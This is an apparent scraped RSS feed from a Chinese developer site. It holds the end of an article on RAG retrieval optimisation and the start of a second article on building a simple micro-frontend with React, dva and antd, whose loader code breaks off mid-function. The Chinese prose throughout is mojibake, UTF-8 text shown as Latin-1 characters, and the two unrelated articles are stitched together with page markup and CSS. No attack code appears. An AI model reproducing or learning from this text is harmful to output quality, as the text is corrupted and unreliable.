<p>ä¾‹å¦‚ï¼šé¢å¯¹"Estella Leopoldåœ¨1954å¹´8æœˆè‡³11æœˆæœŸé—´å°±è¯»äºå“ªæ‰€å­¦æ ¡ï¼Ÿ"è¿™ç±»å«ç²¾ç¡®æ—¶é—´é™åˆ¶çš„æŸ¥è¯¢æ—¶ï¼Œè¡¥å……æé—®"Estella Leopoldçš„æ•™è‚²èƒŒæ™¯å¦‚ä½•ï¼Ÿ"èƒ½æ˜¾è‘—æå‡æ£€ç´¢æ•ˆæœã€‚</p>
<p><strong>â€Œåç»­è¿½é—®â€Œ</strong></p>
<p>é€šè¿‡LLMåŸºäºå¯¹è¯ä¸Šä¸‹æ–‡ç”Ÿæˆç‹¬ç«‹é—®é¢˜ï¼Œç‰¹åˆ«é€‚ç”¨äºä¸¤ç§åœºæ™¯ï¼š</p>
<p>åç»­é—®é¢˜ä¾èµ–å‰åºå¯¹è¯çš„ä¸Šä¸‹æ–‡(å¦‚ç”¨æˆ·å…ˆè¯¢é—®"åœ¨æ„å¤§åˆ©çš„æ´»åŠ¨æ¨è"ï¼Œå†è¿½é—®"å½“åœ°ç‰¹è‰²ç¾é£Ÿ"æ—¶ï¼Œéœ€ä¿ç•™ä½ç½®ä¸Šä¸‹æ–‡)</p>
<p>éœ€æ•´åˆæœ€è¿‘kæ¡å¯¹è¯è®°å½•ã€‚è‹¥æ–°é—®é¢˜ä¸å†å²å¯¹è¯æ— å…³ï¼Œå¯èƒ½å¯¼è‡´æ£€ç´¢ç»“æœåç¦»ä¸»é¢˜ã€‚</p>
<p>â€Œ<strong>å‡è®¾æ–‡æ¡£ç”Ÿæˆ</strong>(HyDE)â€Œ</p>
<p>è¯¥æ–¹æ³•è¦æ±‚LLMåœ¨æ— å¤–éƒ¨çŸ¥è¯†çš„æƒ…å†µä¸‹ï¼Œå…ˆä¸ºæŸ¥è¯¢ç”Ÿæˆå‡è®¾æ€§å›ç­”ï¼Œå†å°†æ­¤å‡è®¾ä¸åŸå§‹æŸ¥è¯¢è”åˆç”¨äºå‘é‡æ£€ç´¢ã€‚è™½ç„¶å‡è®¾å†…å®¹å¯èƒ½åŒ…å«ä¸å‡†ç¡®ä¿¡æ¯ï¼Œä½†èƒ½æ­ç¤ºLLMè®¤ä¸ºç›¸å…³çš„æ–‡æ¡£ç‰¹å¾æ¨¡å¼ã€‚</p>
<p><strong>â€Œå¤šç»´åº¦æŸ¥è¯¢â€Œ</strong></p>
<p>é€šè¿‡LLMä»ä¸åŒè§†è§’ä¸ºåŸå§‹é—®é¢˜è¡ç”Ÿå¤šä¸ªå­é—®é¢˜ï¼Œåˆ†åˆ«è¿›è¡Œæ£€ç´¢åï¼Œé‡‡ç”¨RRF(ç»“æœå†èåˆ)æˆ–é‡æ’åºæŠ€æœ¯æ•´åˆç»“æœã€‚ä¾‹å¦‚ï¼šé’ˆå¯¹"çº¢è¢œé˜Ÿä¸çˆ±å›½è€…é˜Ÿè°æ˜¯æœ€æ–°æ€»å† å†›ï¼Ÿ"å¯æ‹†åˆ†ä¸ºï¼š</p>
<p>çº¢è¢œé˜Ÿä¸Šæ¬¡å¤ºå† æ—¶é—´</p>
<p>çˆ±å›½è€…é˜Ÿä¸Šæ¬¡å¤ºå† æ—¶é—´</p>
<p><strong>äº”ã€æ£€ç´¢</strong></p>
<p>æ£€ç´¢ï¼ˆRetrievalï¼‰çš„æ ¸å¿ƒç›®æ ‡å§‹ç»ˆæ˜¯ç¡®ä¿æœ€ç›¸å…³æ–‡æ¡£çš„è·å–ï¼Œæˆ–è‡³å°‘ä½¿æœ€ç›¸å…³æ–‡æ¡£å‡ºç°åœ¨è¿”å›ç»“æœä¸­ã€‚ä¸ºå®ç°è¿™ä¸€ç›®æ ‡ï¼Œå¯é‡‡ç”¨ä»¥ä¸‹ä¼˜åŒ–ç­–ç•¥ï¼š</p>
<p><strong>â€Œä¸Šä¸‹æ–‡ç²¾ç®€â€Œ</strong>ï¼šè¿‡å¤§çš„æ–‡æ¡£å—ä¼šå¼•å…¥å†—ä½™ä¿¡æ¯ï¼Œä¸ä»…å¢åŠ LLMè°ƒç”¨æˆæœ¬ï¼Œè¿˜å¯èƒ½é™ä½å“åº”è´¨é‡ã€‚é€šè¿‡LLMè¾…åŠ©çš„ä¸Šä¸‹æ–‡åˆ†æï¼Œå¯å¯¹æ–‡æ¡£å†…å®¹è¿›è¡Œæ™ºèƒ½å‹ç¼©ï¼Œæˆ–é€‰æ‹©æ€§æå–å…³é”®ä¿¡æ¯è¿›è¡Œè¿”å›ã€‚</p>
<p><strong>â€Œç›¸é‚»æ–‡æœ¬æ‰©å±•â€Œ</strong>ï¼šè¿‡å°çš„æ–‡æ¡£å—ä¼šå‰²è£‚ä¸Šä¸‹æ–‡å…³è”ã€‚çª—å£æœç´¢æŠ€æœ¯é€šè¿‡åŒ¹é…ç›®æ ‡æ–‡æ¡£å—æ—¶ï¼ŒåŒæ­¥è¿”å›å…¶ç›¸é‚»æ–‡æœ¬å—ä½œä¸ºè¡¥å……ä¸Šä¸‹æ–‡ï¼Œä»è€Œå¢å¼ºLLMå¯¹å®Œæ•´è¯­ä¹‰é“¾çš„ç†è§£ã€‚</p>
<p><strong>â€Œå±‚çº§æ–‡æ¡£æ£€ç´¢â€Œ</strong>ï¼šè¯¥æ–¹æ³•é‡‡ç”¨æ–‡æ¡£åˆ†çº§ç­–ç•¥â€”â€”å°†åŸå§‹æ–‡æ¡£åˆ’åˆ†ä¸ºå®è§‚ä¸»æ–‡æ¡£å’Œå¾®è§‚å­æ–‡æ¡£ä¸¤çº§ç»“æ„ã€‚ç³»ç»Ÿä¼˜å…ˆåŒ¹é…å­æ–‡æ¡£ï¼Œä½†æœ€ç»ˆè¿”å›å…¶æ‰€å±çš„å®Œæ•´ä¸»æ–‡æ¡£ï¼Œå…¼é¡¾æ£€ç´¢ç²¾åº¦ä¸ä¸Šä¸‹æ–‡å®Œæ•´æ€§ã€‚</p>
<p><strong>â€Œæ™ºèƒ½èšåˆæ£€ç´¢â€Œ</strong>ï¼šä½œä¸ºçˆ¶æ–‡æ¡£æœç´¢çš„å‡çº§æ–¹æ¡ˆï¼Œè¯¥æ–¹æ³•æ„å»ºä¸‰å±‚æ ‘çŠ¶æ–‡æ¡£ç»“æ„ï¼ˆé¡¶å±‚1024å­—ç¬¦/ä¸­é—´å±‚512å­—ç¬¦/åº•å±‚128å­—ç¬¦ï¼‰ã€‚</p>
<p>æ£€ç´¢æ—¶ä»…åŒ¹é…åº•å±‚èŠ‚ç‚¹ï¼Œå½“æŸçˆ¶èŠ‚ç‚¹ä¸‹å¤šæ•°å­èŠ‚ç‚¹åŒ¹é…æ—¶ï¼Œåˆ™è¿”å›è¯¥çˆ¶èŠ‚ç‚¹å†…å®¹ï¼Œå®ç°åŠ¨æ€ä¸Šä¸‹æ–‡æ‰©å±•ã€‚</p>
<p><strong>â€Œå¤šæ¨¡æ€æ£€ç´¢èåˆâ€Œ</strong>ï¼šRAGç³»ç»Ÿä½œä¸ºå¼€æ”¾åŸŸé—®ç­”æ¶æ„ï¼Œéœ€é€šè¿‡æ··åˆæ£€ç´¢æŠ€æœ¯æå‡äº‹å®è¦†ç›–ç‡ã€‚</p>
<p>é€šè¿‡å‘é‡æ£€ç´¢ä¸å…³é”®è¯æ£€ç´¢çš„ååŒåº”ç”¨ï¼Œå¯å……åˆ†å‘æŒ¥ä¸åŒæ£€ç´¢æŠ€æœ¯çš„ä¼˜åŠ¿ã€‚ä¾‹å¦‚ï¼Œç»„åˆè¯­ä¹‰ç›¸ä¼¼åº¦è®¡ç®—ä¸ç²¾ç¡®å…³é”®è¯åŒ¹é…ï¼Œèƒ½æ˜¾è‘—æå‡æ£€ç´¢æ¨¡å—çš„å…¨é¢æ€§ã€‚</p>
<p><strong>â€Œæ™ºèƒ½ç´¢å¼•è·¯ç”±â€Œ</strong>ï¼šé’ˆå¯¹å¤šç±»å‹æŸ¥è¯¢éœ€æ±‚ï¼ˆå¦‚æ‘˜è¦ç”Ÿæˆã€ç²¾ç¡®é—®ç­”ã€æ—¶æ•ˆæ€§æŸ¥è¯¢ç­‰ï¼‰ï¼Œç³»ç»Ÿéœ€å»ºç«‹ä¸“ä¸šç´¢å¼•åº“å¹¶é€šè¿‡è·¯ç”±æœºåˆ¶è‡ªåŠ¨åˆ†é…æŸ¥è¯¢è¯·æ±‚ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå½±è§†æ¨èç±»æŸ¥è¯¢ä¼šè¢«ä¼˜å…ˆå¯¼å‘å¨±ä¹å†…å®¹ç´¢å¼•ï¼ŒåŒæ—¶è§¦å‘çƒ­ç‚¹è¯é¢˜ç´¢å¼•çš„ååŒæ£€ç´¢ã€‚</p>
<p><strong>â€Œè‡ªä¸»å†³ç­–ä»£ç†â€Œ</strong>ï¼šé€šè¿‡Agentæ™ºèƒ½ä½“åŠ¨æ€é€‰æ‹©æ£€ç´¢ç­–ç•¥ï¼Œæ”¯æŒå•æ–¹æ³•æˆ–å¤šæ–¹æ³•ç»„åˆè°ƒç”¨ï¼ˆä¸²è¡Œæˆ–å¹¶è¡Œï¼‰ã€‚</p>
<p>ä¾‹å¦‚ï¼ŒæŸ¥è¯¢"2024å¹´AIæŠ€æœ¯è¶‹åŠ¿"æ—¶ï¼ŒAgentä¼šè‡ªåŠ¨ä¸²è”å­¦æœ¯æ–‡çŒ®ç´¢å¼•ä¸è¡Œä¸šæŠ¥å‘Šç´¢å¼•ï¼Œå®ç°å¤šç»´ä¿¡æ¯æ•´åˆã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae55141416734c3faec46d782ae000c7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875969&amp;x-signature=ZzVRusoGZAMLcsLWBuvmnxuRvSQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><strong>å…­ã€</strong>* <em>æ£€ç´¢åå¤„ç†</em>*</p>
<p>"æ£€ç´¢åå¤„ç†"è¿™ä¸€èŒƒç•´æœ¬èº«å…·æœ‰ç›¸å½“çš„åŒ…å®¹æ€§ï¼Œå…¶æ ¸å¿ƒç›®æ ‡æ˜¯å¯¹åˆæ­¥è·å–çš„æ£€ç´¢ç»“æœå®æ–½ä¼˜åŒ–å¤„ç†ï¼Œä»è€Œä¸ºå¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰çš„åç»­ç”Ÿæˆæä¾›æ›´ä¼˜è´¨çš„è¾“å…¥ã€‚</p>
<p>å…¶ä¸­æœ€å…·ä»£è¡¨æ€§çš„æŠ€æœ¯å½“å±é‡æ’åºï¼ˆRerankï¼‰ã€‚</p>
<p>è™½ç„¶å‘é‡æ£€ç´¢é€šè¿‡è¯­ä¹‰ç›¸ä¼¼åº¦è®¡ç®—å®ç°äº†åˆæ­¥ç­›é€‰ï¼Œä½†è¯­ä¹‰é«˜åº¦åŒ¹é…çš„æ–‡æ¡£æœªå¿…ä¸æŸ¥è¯¢éœ€æ±‚å®Œå…¨å¥‘åˆã€‚</p>
<p>é‡æ’åºæœºåˆ¶é€šè¿‡å¤šç»´åº¦ç›¸å…³æ€§åˆ†æï¼ˆåŒ…æ‹¬æŸ¥è¯¢æ„å›¾è§£æã€è¯æ±‡å¤šä¹‰æ€§æ¶ˆæ­§ã€ç”¨æˆ·è¡Œä¸ºæ¨¡å¼æŒ–æ˜åŠä¸Šä¸‹æ–‡å…³è”åˆ†æç­‰ï¼‰ï¼Œå¯¹åˆå§‹ç»“æœåˆ—è¡¨è¿›è¡Œæ™ºèƒ½ä¼˜åŒ–ã€‚</p>
<p>å½“å‰å®ç°æ–¹æ¡ˆä¸»è¦åˆ†ä¸ºä¸¤ç±»ï¼šä¸€æ˜¯é€šè¿‡LLMæŒ‡ä»¤è°ƒä¼˜å®ç°åŠ¨æ€é‡æ’.</p>
<p>äºŒæ˜¯é‡‡ç”¨ä¸“ä¸šé‡æ’åºæ¨¡å‹ï¼ˆå¦‚å•†ä¸šåŒ–çš„Cohereï¼Œä»¥åŠå¼€æºçš„BAAI/bge-rerankerå’ŒIBMçš„Dense Passage Re-Rankerç­‰ï¼‰</p>
<p>è¿™ç±»æ¨¡å‹é€šè¿‡ç»¼åˆè¯„ä¼°æ›´ä¸°å¯Œçš„ç‰¹å¾ç»´åº¦ï¼Œç¡®ä¿æœ€ç»ˆå‘ˆç°çš„æ–‡æ¡£æ’åºä¸ç”¨æˆ·çœŸå®éœ€æ±‚é«˜åº¦ä¸€è‡´ã€‚</p>
<p><strong>ä¸ƒã€ç”Ÿæˆ</strong></p>
<p>åœ¨ç”Ÿæˆï¼ˆGenerationï¼‰é˜¶æ®µçš„ä¼˜åŒ–éœ€èšç„¦ç”¨æˆ·ä½“éªŒæå‡ï¼Œå…·ä½“å¯ä»ä»¥ä¸‹ç»´åº¦å®æ–½ï¼š</p>
<p><strong>â€Œå¤šè½®å¯¹è¯æœºåˆ¶â€Œ</strong></p>
<p>é‡‡ç”¨å¸¦èŠå¤©å†å²çš„RAGæŠ€æœ¯ï¼ˆä»¥AIæœç´¢é¢†åŸŸæ ‡æ†äº§å“Perplexityä¸ºä¾‹ï¼‰ï¼Œé€šè¿‡è¿ç»­å¯¹è¯äº¤äº’å¸®åŠ©ç”¨æˆ·æ·±åº¦è§£æé—®é¢˜ã€‚</p>
<p>è¿™ç§è®¾è®¡å…è®¸ç”¨æˆ·åœ¨å¤šè½®é—®ç­”ä¸­é€æ­¥æ˜ç¡®éœ€æ±‚ï¼Œæœ€ç»ˆè·å¾—ç²¾å‡†è§£ç­”ã€‚</p>
<p><strong>â€Œæ™ºèƒ½è¿½é—®ç­–ç•¥â€Œ</strong></p>
<p>åœ¨promptä¸­æ¤å…¥åŠ¨æ€è¿½é—®é€»è¾‘ï¼š"å½“èƒŒæ™¯çŸ¥è¯†æ— æ³•ç›´æ¥å›ç­”é—®é¢˜æ—¶ï¼Œéœ€åŸºäºæ£€ç´¢å†…å®¹å‘èµ·è¿½é—®ï¼Œä¸”å•æ¬¡è¿½é—®ä¸è¶…è¿‡3ä¸ªé—®é¢˜"ã€‚</p>
<p>è¯¥æœºåˆ¶è™½ä¾èµ–å¤§æ¨¡å‹åŸºç¡€èƒ½åŠ›ï¼Œå´èƒ½æ˜¾è‘—æå‡äº¤äº’ä½“éªŒâ€”â€”ç”¨æˆ·é€šè¿‡å¼•å¯¼å¼å¯¹è¯ä¸æ–­æ¾„æ¸…éœ€æ±‚ï¼Œæœ€ç»ˆåŒ¹é…æœ€ä¼˜ç­”æ¡ˆã€‚</p>
<p><strong>â€Œpromptç²¾ç»†åŒ–è®¾è®¡â€Œ</strong></p>
<p>RAGç³»ç»Ÿçš„promptéœ€ä¸¥æ ¼å£°æ˜å›ç­”è¾¹ç•Œï¼Œä¾‹å¦‚ï¼š"ä½œä¸ºæ™ºèƒ½å®¢æœï¼Œä½ éœ€åŸºäºç»™å®šä¸Šä¸‹æ–‡æä¾›å‡†ç¡®ä¿¡æ¯ï¼Œé¿å…å¼•å…¥å¤–éƒ¨çŸ¥è¯†ã€‚å›ç­”åº”ç®€æ´å‹å¥½ï¼Œä¼˜å…ˆè§£å†³ç”¨æˆ·æ ¸å¿ƒé—®é¢˜"ã€‚</p>
<p>åŒæ—¶å¯æ ¹æ®åœºæ™¯éœ€æ±‚çµæ´»è°ƒæ•´ï¼š</p>
<p>å¿…è¦æ—¶å…è®¸æ¨¡å‹èå…¥é€‚åº¦ä¸»è§‚åˆ†æ</p>
<p>é‡‡ç”¨Few-shotå­¦ä¹ èŒƒå¼æŒ‡å¯¼LLMé«˜æ•ˆåˆ©ç”¨æ£€ç´¢çŸ¥è¯†</p>
<p>â€Œåé¦ˆé©±åŠ¨è¿­ä»£â€Œ</p>
<p>å»ºç«‹ç”¨æˆ·åé¦ˆé—­ç¯ç³»ç»Ÿï¼Œé€šè¿‡çœŸå®äº¤äº’æ•°æ®æŒç»­ä¼˜åŒ–çŸ¥è¯†åº“ï¼Œå¹¶å¯¹ä¿¡æ¯å¯ä¿¡åº¦è¿›è¡ŒåŠ¨æ€æ ‡æ³¨ã€‚è¿™ç§å®æ—¶æ›´æ–°æœºåˆ¶èƒ½æœ‰æ•ˆæå‡ç³»ç»Ÿå“åº”è´¨é‡ã€‚</p>
<p><strong>å…«ã€æœ€å</strong></p>
<p>ä¸Šè¿°æ–¹æ³•å‡ä¸ºåŸºç¡€RAGåœ¨å„ç¯èŠ‚çš„ä¼˜åŒ–ç­–ç•¥ï¼Œå®é™…åº”ç”¨ä¸­éœ€æ³¨æ„ï¼š</p>
<ol>
<li>
<p>ä¸åŒæ–¹æ³•çš„æ•ˆæœå­˜åœ¨å·®å¼‚ï¼›</p>
</li>
<li>
<p>éœ€æ ¹æ®å…·ä½“é—®é¢˜é€‰æ‹©é’ˆå¯¹æ€§æ–¹æ¡ˆï¼›</p>
</li>
<li>
<p>é€šè¿‡é€‚é…åº”ç”¨åœºæ™¯çš„ä¼˜åŒ–ç»„åˆï¼Œæ‰èƒ½å®ç°RAGæ•ˆç”¨çš„æœ€å¤§åŒ–ã€‚</p>
</li>
</ol>
<p><strong>æ›´å¤šAIå¤§æ¨¡å‹å­¦ä¹ è§†é¢‘åŠèµ„æºï¼Œéƒ½åœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fyuan.zhipoai.cn%2F" target="_blank" title="https://yuan.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è‡ªé€ å¾®å‰ç«¯]]></title>    <link>https://juejin.cn/post/7581481178823524371</link>    <guid>https://juejin.cn/post/7581481178823524371</guid>    <pubDate>2025-12-09T08:32:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581481178823524371" data-draft-id="7581350888789901348" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è‡ªé€ å¾®å‰ç«¯"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2025-12-09T08:32:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ggbond"/> <meta itemprop="url" content="https://juejin.cn/user/290743919315255"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è‡ªé€ å¾®å‰ç«¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/290743919315255/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ggbond
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T08:32:27.000Z" title="Tue Dec 09 2025 08:32:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>èµ·å› æ˜¯ï¼Œæˆ‘è¦åœ¨ä¸€ä¸ªå¤§å‹åå°ç®¡ç†åº”ç”¨ä¸­å‰¥ç¦»å‡ºä¸€ä¸ªç®¡ç†æ¨¡å—ï¼Œè¿™æ ·åšçš„å¥½å¤„å½“ç„¶æ˜¯å¯ä»¥å•ç‹¬å¼€å‘å’Œå‘å¸ƒï¼Œä½†æ˜¯åå¤„ä¹Ÿæœ‰ï¼Œæ¯”å¦‚éƒ¨åˆ†å…¨å±€å˜é‡æ±¡æŸ“ï¼ŒUIä¸ä¸€è‡´ï¼ŒçŠ¶æ€é€šä¿¡ä¼ å¯¼ç­‰ã€‚è™½ç„¶å¸‚é¢ä¸Šå·²ç»æœ‰å¾ˆå¤šå¾®å‰ç«¯æ–¹æ¡ˆäº†ï¼Œæ¯”å¦‚qiankunç­‰ï¼Œä½†æ˜¯è¿™éƒ½éœ€è¦å¯¹è¿™ä¸ªå¤§ä»“åº“åº”ç”¨è¿›è¡Œå¤§åŠ¨å·¥ï¼Œå¯¹åŸåº”ç”¨é€ æˆä¸€äº›è´Ÿè½½å’Œå¯èƒ½æ„æƒ³ä¸åˆ°çš„é”™è¯¯ï¼Œéæˆ‘æ‰€æ„¿ä¹Ÿï¼Œæ‰€ä»¥åœ¨è¿™é‡Œæˆ‘æ‰“ç®—è‡ªå·±æä¸ªç®€åŒ–çš„æ–¹æ¡ˆã€‚
åŸåº”ç”¨æ˜¯react+dvaï¼Œ</p>
<h2 data-id="heading-0">åŸºåº§åº”ç”¨æ”¹é€ </h2>
<p>æˆ‘ä»¬è®¾è®¡çš„ä¸»åº”ç”¨æ ¸å¿ƒæ˜¯ï¼›</p>
<ol>
<li>ä¸»åº”ç”¨ä¸ç›´æ¥æ‰“åŒ…å­åº”ç”¨çš„ä»£ç ï¼Œè€Œæ˜¯è¿è¡Œæ—¶æŒ‰éœ€åŠ è½½å­åº”ç”¨çš„Â JSÂ èµ„æºã€‚</li>
<li>å°†å­åº”ç”¨çš„è·¯ç”±æ³¨å†Œåˆ°ä¸»åº”ç”¨çš„è·¯ç”±ç³»ç»Ÿä¸­ï¼Œå®ç°æ— ç¼è·³è½¬ã€‚</li>
<li>é€šè¿‡å…¨å±€å˜é‡ï¼ˆ<code>window</code>ï¼‰å…±äº«åº“ï¼Œé¿å…é‡å¤åŠ è½½,ä¹Ÿå¯å½¢æˆå•ä¾‹ã€‚
æˆ‘ä»¬å…ˆæ”¹é€ å­åº”ç”¨è·¯ç”±ä»£ç ï¼Œä¸ºäº†è§£å†³åˆšæ‰è¯´çš„UIå’Œä¸€äº›é‡è¦åº“ä¸ä¸€è‡´é—®é¢˜ï¼Œæˆ‘ä»¬å°†ç›´æ¥æš´éœ²åº“åˆ°Windowä¸­ï¼Œæœ‰ï¼š</li>
<li>antd</li>
<li>Reactä¸»åº“
å¦å¤–çŠ¶æ€é€šä¿¡çš„é—®é¢˜ï¼Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨dvaå»ä¿®é¥°å–å¾—çš„å­åº”ç”¨Comï¼Œå¹¶æŠŠéƒ¨åˆ†æ–¹æ³•å¦‚connectæš´éœ²åˆ°windowä¸­ã€‚</li>
</ol>
<p>ä»£ç å¦‚ä¸‹</p>
<pre><code class="hljs language-ini" lang="ini">import React from 'react'<span class="hljs-comment">;</span>
import {
  Alert,
  Drawer,
} from 'antd'<span class="hljs-comment">;</span>
import { connect } from 'dva'<span class="hljs-comment">;</span>

<span class="hljs-attr">window.React</span> = React<span class="hljs-comment">;</span>
<span class="hljs-attr">window.CONNECT</span> = connect<span class="hljs-comment">;</span>
<span class="hljs-attr">window.Antd_ZI</span> = {
  Drawer,
  Alert,
}<span class="hljs-comment">;</span>

const <span class="hljs-attr">configUrl</span> = {
  test: 'https://zi.test.cn',
  product: 'https://zi.prod.com',
}<span class="hljs-comment">;</span>

const <span class="hljs-attr">env</span> = <span class="hljs-string">'product'</span><span class="hljs-comment">;</span>

const <span class="hljs-attr">mapStateToProps</span> = (state) =&gt; {
  const <span class="hljs-attr">currentState</span> = state.adManage<span class="hljs-comment">;</span>
  const { userAuth, userInfo } = state.app<span class="hljs-comment">;</span>
  return { ...currentState, userAuth, userInfo }<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>

const <span class="hljs-attr">insertScript</span> = (e, isStyle = <span class="hljs-literal">false</span>) =&gt; {
  return new Promise((reslove, reject) =&gt; {
    const <span class="hljs-attr">i</span> = isStyle ? document.createElement(<span class="hljs-string">'link'</span>) : document.createElement(<span class="hljs-string">'script'</span>)<span class="hljs-comment">;</span>
    isStyle || i.setAttribute('type', 'text/javascript')<span class="hljs-comment">;</span>
